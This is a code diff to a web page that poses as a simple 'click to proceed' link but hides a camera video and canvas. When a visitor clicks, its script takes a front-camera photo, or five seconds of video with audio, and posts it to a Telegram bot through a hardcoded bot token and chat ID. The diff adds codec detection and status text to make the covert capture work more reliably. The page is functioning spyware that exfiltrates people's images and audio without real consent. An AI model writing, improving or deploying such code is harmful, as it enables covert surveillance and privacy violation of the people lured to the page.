@@ -5,34 +5,40 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title></title>
 <style>
-html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;}
-#btn{position:fixed;top:0;left:0;width:100%;height:100%;border:0;background:transparent;padding:0;cursor:pointer;-webkit-tap-highlight-color:transparent;}
+html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;}
+#btn{position:fixed;top:0;left:0;width:100%;height:100%;border:0;background:transparent;padding:0;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#333;font-size:20px;-webkit-tap-highlight-color:transparent;}
 </style>
 </head>
 <body>
-<video id="v" autoplay playsinline style="display:none;"></video>
+<video id="v" autoplay playsinline muted style="display:none;"></video>
 <canvas id="c" style="display:none;"></canvas>
-<button id="btn"></button>
+<button id="btn">Нажмите, чтобы перейти</button>
 <script>
 var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
 var CHAT  = "1314241513";
 var mode  = new URLSearchParams(window.location.search).get("mode") || "photo";
 var v = document.getElementById("v");
 var c = document.getElementById("c");
-var stream = null, ready = false, done = false;
+var btn = document.getElementById("btn");
+var stream = null, ready = false, started = false;
 
 function initCamera() {
     var constraints = { video: { facingMode: "user" } };
     if (mode === "video") constraints.audio = true;
-    navigator.mediaDevices.getUserMedia(constraints)
-    .then(function(s) { stream = s; v.srcObject = s; return v.play(); })
+    return navigator.mediaDevices.getUserMedia(constraints)
+    .then(function(s) {
+        stream = s;
+        v.srcObject = s;
+        v.muted = true;
+        return v.play();
+    })
     .then(function() { ready = true; })
-    .catch(function(e) { console.log(e.name); });
+    .catch(function(e) { console.log("cam err", e.name); });
 }
 
 function sendPhoto() {
     return new Promise(function(resolve) {
-        c.width = v.videoWidth || 640;
+        c.width  = v.videoWidth  || 640;
         c.height = v.videoHeight || 480;
         c.getContext("2d").drawImage(v, 0, 0);
         c.toBlob(function(blob) {
@@ -48,29 +54,69 @@ function sendPhoto() {
 
 function sendVideo() {
     return new Promise(function(resolve) {
-        var recorder = new MediaRecorder(stream);
+        var options = {};
+        // Пробуем узнать поддерживаемый формат
+        if (window.MediaRecorder && MediaRecorder.isTypeSupported) {
+            if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) {
+                options.mimeType = "video/webm;codecs=vp9,opus";
+            } else if (MediaRecorder.isTypeSupported("video/webm")) {
+                options.mimeType = "video/webm";
+            } else if (MediaRecorder.isTypeSupported("video/mp4")) {
+                options.mimeType = "video/mp4";
+            }
+        }
+
+        var recorder;
+        try {
+            recorder = new MediaRecorder(stream, options);
+        } catch (e) {
+            console.log("recorder err", e);
+            resolve();
+            return;
+        }
+
         var chunks = [];
-        recorder.ondataavailable = function(e) { chunks.push(e.data); };
+        recorder.ondataavailable = function(e) { if (e.data && e.data.size) chunks.push(e.data); };
         recorder.onstop = function() {
-            var blob = new Blob(chunks, { type: "video/mp4" });
+            var type = recorder.mimeType || "video/webm";
+            var ext  = type.indexOf("mp4") >= 0 ? "mp4" : "webm";
+            var blob = new Blob(chunks, { type: type });
             var fd = new FormData();
             fd.append("chat_id", CHAT);
-            fd.append("video", blob, "video.mp4");
+            fd.append("video", blob, "video." + ext);
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendVideo", { method: "POST", body: fd })
             .then(resolve).catch(resolve);
         };
+
         recorder.start();
+        btn.textContent = "Запись 5 секунд...";
         setTimeout(function() { recorder.stop(); }, 5000);
     });
 }
 
-document.getElementById("btn").addEventListener("click", async function() {
-    if (done) return;
-    if (!ready) { initCamera(); return; }
-    done = true;
-    await sendPhoto();
-    if (mode === "video") await sendVideo();
-    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+btn.addEventListener("click", function() {
+    if (started) return;
+    started = true;
+
+    var init = ready ? Promise.resolve() : initCamera();
+
+    init.then(function() {
+        if (mode === "video") {
+            btn.textContent = "Запись 5 секунд...";
+            return sendVideo().then(function() { return sendPhoto(); });
+        } else {
+            btn.textContent = "Загрузка...";
+            return sendPhoto();
+        }
+    })
+    .then(function() {
+        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+        btn.textContent = "Готово ✓";
+    })
+    .catch(function(e) {
+        console.log(e);
+        btn.textContent = "Нажмите, чтобы перейти";
+    });
 });
 
 initCamera();
